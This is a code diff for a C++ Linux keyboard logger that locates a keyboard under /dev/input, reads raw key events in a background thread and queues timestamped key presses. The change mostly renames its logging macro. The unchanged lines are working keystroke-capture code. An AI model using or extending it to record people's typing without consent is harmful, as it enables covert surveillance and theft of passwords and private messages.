@@ -33,26 +33,26 @@ logger::~logger() { kill(); }
 
 auto logger::init(const std::string& event_ID) -> bool {
 	if (check_init()) {
-		LOG(messagetype::error, "logger (init): logger already initialized.");
+		MSG(messagetype::error, "logger (init): logger already initialized.");
 		return false;
 	}
 
 	auto const device = event_ID.empty() ? find_kbd() : event_ID;
 	if (device.empty()) {
-		LOG(messagetype::error, "logger (init): no viable keyboard device found.");
+		MSG(messagetype::error, "logger (init): no viable keyboard device found.");
 		return false;
 	}
 
 	fd_ = open(device.c_str(), O_RDONLY | O_NONBLOCK);
 	if (fd_ == -1) {
-		LOG(messagetype::error, "logger (init): failed to open device.");
+		MSG(messagetype::error, "logger (init): failed to open device.");
 		return false;
 	}
 
 	initialized_ = true;
 	ev_init_     = device;
 
-	LOG(messagetype::info, "logger (init): initialized");
+	MSG(messagetype::info, "logger (init): initialized");
 	return true;
 }
 
@@ -60,23 +60,23 @@ auto logger::check_init() const -> bool { return initialized_; }
 
 auto logger::start() -> void {
 	if (!check_init()) {
-		LOG(messagetype::error, "logger (start): logger not initialized.");
+		MSG(messagetype::error, "logger (start): logger not initialized.");
 		return;
 	}
 	if (running_) {
-		LOG(messagetype::warning, "logger (start): logger already running.");
+		MSG(messagetype::warning, "logger (start): logger already running.");
 		return;
 	}
 
 	running_ = true;
 
 	if (work_.joinable()) {
-		LOG(messagetype::debug, "logger (start): joining worker thread.");
+		MSG(messagetype::debug, "logger (start): joining worker thread.");
 		work_.join();
 	}
 
 	work_ = std::thread(&logger::ev_reader, this);
-	LOG(messagetype::info, "logger (start): logger processing thread started.");
+	MSG(messagetype::info, "logger (start): logger processing thread started.");
 }
 
 auto logger::kill() -> void {
@@ -90,7 +90,7 @@ auto logger::kill() -> void {
 	}
 	initialized_ = false;
 	ev_init_.clear();
-	LOG(messagetype::debug, "logger (kill): sender killed.");
+	MSG(messagetype::debug, "logger (kill): logger killed.");
 }
 
 auto logger::
@@ -99,7 +99,7 @@ auto logger::
 	auto conf = std::ifstream(config);
 
 	if (!conf.is_open()) {
-		LOG(messagetype::error, "logger (load_keymap): keymap config error.");
+		MSG(messagetype::error, "logger (load_keymap): keymap config error.");
 		return tmp;
 	}
 
@@ -125,7 +125,7 @@ auto logger::fd_monitor(signed int fd, fd_set& fds) -> signed int {
 
 	auto const retval = select(fd + 1, &fds, nullptr, nullptr, &timeout);
 	if (retval == -1) {
-		LOG(messagetype::error, "logger (fd_monitor): select error.");
+		MSG(messagetype::error, "logger (fd_monitor): select error.");
 	}
 
 	return retval;
@@ -145,11 +145,11 @@ auto logger::datetime(time_t tv_sec) -> std::pair<std::string, std::string> {
 auto logger::find_kbd() -> std::string {
 	auto const dev_input = "/dev/input";
 	if (!std::filesystem::exists(dev_input)) {
-		LOG(messagetype::error, "logger (find_kbd): /dev/input directory not found.");
+		MSG(messagetype::error, "logger (find_kbd): /dev/input directory not found.");
 		return "";
 	}
 	if (!std::filesystem::is_directory(dev_input)) {
-		LOG(messagetype::error, "logger (find_kbd): /dev/input is not a directory.");
+		MSG(messagetype::error, "logger (find_kbd): /dev/input is not a directory.");
 		return "";
 	}
 
@@ -157,11 +157,11 @@ auto logger::find_kbd() -> std::string {
 		auto const& path = event_num.path();
 		if (path.filename().string().find("event") == 0) {
 			auto const resolved_path = path.string();
-			LOG(messagetype::debug, "logger (find_kbd): attempting device " + resolved_path);
+			MSG(messagetype::debug, "logger (find_kbd): attempting device " + resolved_path);
 
 			auto fd = open(resolved_path.c_str(), O_RDONLY | O_NONBLOCK);
 			if (fd == -1) {
-				LOG(messagetype::debug, "logger (find_kbd): fd = -1");
+				MSG(messagetype::debug, "logger (find_kbd): fd = -1");
 				continue;
 			}
 
@@ -170,25 +170,25 @@ auto logger::find_kbd() -> std::string {
 			auto retval = fd_monitor(fd, fds);
 			if (retval > 0 && FD_ISSET(fd, &fds)) {
 				close(fd);
-				LOG(messagetype::info, "logger (find_kbd): found working input device at " + resolved_path);
+				MSG(messagetype::info, "logger (find_kbd): found working input device at " + resolved_path);
 				return resolved_path;
 			}
-			LOG(messagetype::debug, "logger (find_kbd): device non-responsive: " + resolved_path);
+			MSG(messagetype::debug, "logger (find_kbd): device non-responsive: " + resolved_path);
 			close(fd);
 		}
 	}
-	LOG(messagetype::error, "logger (find_kbd): no viable keyboard device.");
+	MSG(messagetype::error, "logger (find_kbd): no viable keyboard device.");
 	return "";
 }
 
 auto logger::ev_reader() -> void {
-	LOG(messagetype::info, "logger (ev_reader): ev_reader loop started.");
+	MSG(messagetype::info, "logger (ev_reader): ev_reader loop started.");
 	auto ev = input_event{};
 	while (running_) {
 		fd_set fds;
 		auto   retval = fd_monitor(fd_, fds);
 		if (retval == -1) {
-			LOG(messagetype::error, "logger (ev_reader): select error.");
+			MSG(messagetype::error, "logger (ev_reader): select error.");
 			break;
 		}
 
@@ -200,11 +200,11 @@ auto logger::ev_reader() -> void {
 					continue;
 				}
 				else {
-					LOG(messagetype::error, "logger (ev_reader): read error.");
+					MSG(messagetype::error, "logger (ev_reader): read error.");
 					break;
 				}
 			}
-			LOG(messagetype::debug,
+			MSG(messagetype::debug,
 			    "logger (ev_reader): read " + std::to_string(n) + " bytes, ev.type = " + std::to_string(ev.type) +
 			      ", ev.code = " + std::to_string(ev.code) + ", ev.value = " + std::to_string(ev.value));
 
@@ -213,19 +213,19 @@ auto logger::ev_reader() -> void {
 				auto  key_char = get_keychar(ev.code);
 				event e{dtg.first, dtg.second, key_char, ev.value ? true : false};
 				if (ev.value == true) {
-					LOG(messagetype::debug, "logger (ev_reader): pushing event to queue: key = " + e.key);
+					MSG(messagetype::debug, "logger (ev_reader): pushing event to queue: key = " + e.key);
 					q_.push(e);
 				}
 			}
 		}
 	}
-	LOG(messagetype::info, "logger (ev_reader): ev_reader loop terminated.");
+	MSG(messagetype::info, "logger (ev_reader): ev_reader loop terminated.");
 }
 
 auto logger::get_keychar(unsigned int code) -> std::string {
 	auto it = keymap_.find(code);
 	if (it == keymap_.end()) {
-		LOG(messagetype::warning, "logger (get_keychar): unknown key code: " + std::to_string(code));
+		MSG(messagetype::warning, "logger (get_keychar): unknown key code: " + std::to_string(code));
 		return "<unknown>";
 	}
 	return it->second.second;
